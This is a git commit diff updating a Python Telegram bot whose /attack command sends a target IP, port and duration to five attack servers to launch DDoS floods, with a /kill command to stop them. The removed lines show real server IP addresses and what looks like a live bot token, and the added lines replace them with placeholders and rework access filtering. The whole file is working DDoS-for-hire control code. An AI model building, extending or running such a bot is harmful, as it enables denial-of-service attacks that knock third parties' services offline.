e12e628d8e20b7b46be5993383ad1b13bb1f5a9f
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-04-10 20:37:54 +0700

    Update bot.py

--- bot/bot.py
+++ bot/bot.py
@@ -1,20 +1,15 @@
-from telegram.ext import Updater, CommandHandler
+from telegram.ext import Updater, CommandHandler, Filters
 import requests
 import threading
 
-# Danh sách các ID người dùng được phép sử dụng lệnh /attack
-allowed_user_ids = {5561757248, 5519895288}
-
+group_id = -1002005767506
+your_user_id = 5561757248
 def start(update, context):
-    update.message.reply_text("Hello User, Use /attack to send attack")
-
+    update.message.reply_text("👋Hello User, Use /attack to send attack")
 def send_request(url):
     requests.get(url)
-
 def kill(update, context):
-    user_id = update.message.from_user.id
-    if user_id not in allowed_user_ids:
-        update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
+    if update.message.chat_id != your_user_id and update.message.chat_id != group_id:
         return
 
     url1 = f"http://152.42.211.83/?action=kill"
@@ -35,12 +30,10 @@ def kill(update, context):
     thread5.start()
 
     print(f"Kill All DDoS Process")
-    update.message.reply_text(f"Kill All DDoS Process Success")
+    update.message.reply_text(f"✅Kill All DDoS Process Success")
 
 def attack(update, context):
-    user_id = update.message.from_user.id
-    if user_id not in allowed_user_ids:
-        update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
+    if update.message.chat_id != your_user_id and update.message.chat_id != group_id:
         return
 
     args = context.args
@@ -50,11 +43,11 @@ def attack(update, context):
 
     ip, port, time = args
 
-    url1 = f"http://152.42.211.83/?ip={ip}&port={port}&thread=100&time={time}"
-    url2 = f"http://152.42.202.243/?ip={ip}&port={port}&thread=100&time={time}"
-    url3 = f"http://128.199.84.155/?ip={ip}&port={port}&thread=100&time={time}"
-    url4 = f"http://128.199.112.20/?ip={ip}&port={port}&thread=100&time={time}"
-    url5 = f"http://152.42.165.62/?ip={ip}&port={port}&thread=100&time={time}"
+    url1 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
+    url2 = f"http://api?ip={ip}&port={port}&thread=100&time={time}"
+    url3 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
+    url4 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
+    url5 = f"http://api/?ip={ip}&port={port}&thread=100&time={time}"
 
     thread1 = threading.Thread(target=send_request, args=(url1,))
     thread2 = threading.Thread(target=send_request, args=(url2,))
@@ -68,14 +61,14 @@ def attack(update, context):
     thread5.start()
 
     print(f"Attack {ip}:{port} in {time} second")
-    update.message.reply_text(f"DDoS Attack Sent Success To {ip}:{port} in {time} second")
-
+    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}")
 def main():
-    updater = Updater("5759600803:AAHbKQtzJznXGbvhuu7oU46bT31XohtIgz4", use_context=True)
+    updater = Updater("TOKEN_BOT_TELEGRAM", use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("attack", attack))
-    dp.add_handler(CommandHandler("kill", kill))
+    dp.add_handler(CommandHandler("kill", kill, Filters.chat(chat_id=group_id) | Filters.user(user_id=your_user_id)))
+    dp.add_handler(CommandHandler("attack", attack, Filters.chat(chat_id=group_id) | Filters.user(user_id=your_user_id)))
+
     updater.start_polling()
     updater.idle()
 
